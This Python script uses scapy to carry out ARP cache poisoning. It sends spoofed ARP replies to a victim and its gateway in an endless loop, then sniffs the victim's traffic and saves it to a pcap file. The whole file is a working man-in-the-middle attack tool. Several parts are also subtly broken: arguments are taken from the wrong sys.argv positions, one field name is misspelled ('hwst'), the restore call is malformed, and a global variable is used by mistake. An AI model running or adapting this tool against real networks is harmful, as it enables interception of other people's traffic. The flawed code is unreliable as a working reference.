from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(target): #get mac address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target) #create a packet for the target IP
    resp, _ = srp(packet, timeout = 2, retry = 10, verbose = False)#send the packet using scapy
    for _, r in resp:
        return r[Ether].src
    return None
    
class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        #Initializer check (en0 is default interface)
        print(f'initialized {interface}:')
        print(f'Gateway: ({gateway}) is at {self.gateway_mac}')
        print(f'Victim: ({victim}) is at {self.victimmac}')
        print('-'*30)
    
    def run(self):#sets up poison and sniff threads in order to preform most ARP functions
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        
    def poison(self):
        poison_victim = ARP()        #ARP Packet for victim #    
        poison_victim.op = 2                                #   
        poison_victim.psrc = self.gateway                   #
        poison_victim.pdst = self.victim                    #
        poison_victim.hwdst = self.victimmac                #
        print(f'ip src: {poison_victim.psrc}')              #
        print(f'ip dst: {poison_victim.pdst}')              #
        print(f'mac dst: {poison_victim.hwdst}')            #
        print(f'mac src: {poison_victim.hwsrc}')            #   
        print(poison_victim.summary())                      #
        print('-'*30)                                       #
        #####################################################
        poison_gateway = ARP()      #Arp Packet for Gateway #
        poison_gateway.op = 2                               #
        poison_gateway.psrc = self.victim                   #
        poison_gateway.pdst = self.gateway                  #
        poison_gateway.hwst = self.gateway_mac               #
        print(f'ip src: {poison_gateway.psrc}')             #
        print(f'ip dst: {poison_gateway.pdst}')             #
        print(f'mac dst: {poison_gateway.hwdst}')           #
        print(f'mac_src: {poison_gateway.hwsrc}')           #
        print(poison_gateway.summary())                     #
        print('-'*30)                                       #
        print(f'Beginning the ARP poison. [CTRL-C to stop]')#
        while True: #infinite length for attack
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
        
    def sniff(self, count=100):
        time.sleep(5)   #waits to allow poison thread to begin
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim      #Filter for target IP
        packets = sniff(count = count, filter=bpf_filter, iface = self.interface)#sent number of packets to be sent
        wrpcap('arper.pcap', packets)       #write data to a pcap file called arper.pcap
        print ('Got the packets')
        self.restore()      #restore data to original values
        self.poison_thread.terminate()  #terminate
        print('Complete')
        
    def restore(self):
        print('restoring ARP tables...')
        send(ARP)(op = 2, psrc = self.gateway, hwsrc = self.gateway_mac, pdst = self.victim, hwdst = 'ff:ff:ff:ff:ff:ff', count = 5)
        send(ARP(op=2,psrc=self.victim,hwsrc=self.victimmac,pdst=self.gateway,hwdst='ff:ff:ff:ff:ff:ff'),count=5)
        
    
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[0], sys.argv[1], sys.argv[2])
    myarp = Arper(victim, gateway, interface)
    myarp.run()